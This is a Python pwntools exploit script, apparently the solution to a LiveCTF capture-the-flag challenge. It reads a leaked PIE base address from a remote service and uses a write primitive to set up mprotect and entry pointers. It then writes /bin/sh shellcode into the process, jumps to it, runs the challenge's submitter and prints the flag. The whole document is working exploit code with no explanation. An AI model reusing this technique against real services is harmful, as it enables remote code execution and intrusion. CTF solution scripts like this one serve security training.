#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

p = remote(HOST, int(PORT))
# p = process("../handout/challenge")

pie_base = u64(p.recv(6).ljust(8,b"\x00"))
# print(hex(pie_base))
fini = pie_base + 0x4338
p.send(p64(pie_base+0x45a8)+p64(pie_base+0x45a8))
p.send(p64(pie_base+0x4330)+p64(pie_base+0x1374)) # mprotect
# p.send(p64(pie_base+0x2200)+p64(0xdeadbeefcafecafe))
p.send(p64(pie_base+0x4338)+p64(pie_base+0x1200)) # start

# gdb.attach(p, f"""b*{pie_base}+0x1374
# b*{pie_base}+0x2004
# """)

p.send(p64(0))
# print(p.recv(8))
# print(hex(u64(p.recv(8))))
p.send(p32(0))
shellcode = (asm(shellcraft.amd64.linux.sh()))

i = 0
# print(len(shellcode))
while i * 8 < len(shellcode):
    p.send(p64(pie_base+0x2200+8*i)+(shellcode[i * 8:(i + 1) * 8]))
    i += 1

# p.send(p64(pie_base+0x2200)+p64(0xdeadbeefcafecafe)) # shellcode..
p.send(p64(pie_base+0x4330)+p64(pie_base + 0x2200))
p.send(p64(0))
# p.sendline(b"id")
p.recvline()
p.recv(8)
p.sendline(b"./submitter")
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
p.interactive()
